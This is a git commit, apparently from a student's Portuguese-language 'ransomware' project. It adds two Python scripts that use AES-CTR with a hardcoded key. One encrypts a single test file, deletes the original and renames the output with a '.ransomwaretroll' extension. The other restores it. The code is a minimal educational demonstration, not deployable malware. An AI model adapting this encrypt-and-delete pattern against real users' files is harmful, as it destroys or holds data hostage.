decd7b3d3a1531bbc77ca3647fee3201961f0914
Felipe Lira <43833740+lilLiralil@users.noreply.github.com>
2024-08-28 14:51:19 -0300

    upload do projeto final
    codigo para criptografar e decriptografar  arquivo.

---
+++ decrypter.py
@@ -0,0 +1,20 @@
+import os
+import pyaes
+#abrir o arquivo criptografado
+file_name = '/home/s0ulf2/Documents/Projeto-ransomware/teste.txt.ransomwaretroll'
+file = open(file_name,'rb')
+file_data = file.read()
+file.close()
+
+#Setar  a chave de descriptografia
+key = b'testeransomwares'
+aes = pyaes.AESModeOfOperationCTR(key)
+decrypt_data = aes.decrypt(file_data)
+
+#remover arquivo criptografado
+os.remove(file_name)
+#criar um novo arquivo descriptografado
+new_file = 'teste.txt'
+new_file = open(f'{new_file}','wb')
+new_file.write (decrypt_data)
+new_file.close()
---
+++ encrypter.py
@@ -0,0 +1,24 @@
+import os
+import pyaes
+
+#Abrir o arquivo a ser criptografado
+file_name = '/home/s0ulf2/Documents/Projeto-ransomware/teste.txt'
+file =  open(file_name,'rb')
+file_data = file.read()
+file.close
+
+#remover o arquivo original
+os.remove(file_name)
+
+#Definir a chave de encriptação
+key = b"testeransomwares"
+aes =  pyaes.AESModeOfOperationCTR(key)
+
+#criptografar o arquivo
+crypto_data = aes.encrypt(file_data)
+
+#salvar o arquivo criptografado
+new_file = file_name + '.ransomwaretroll'
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
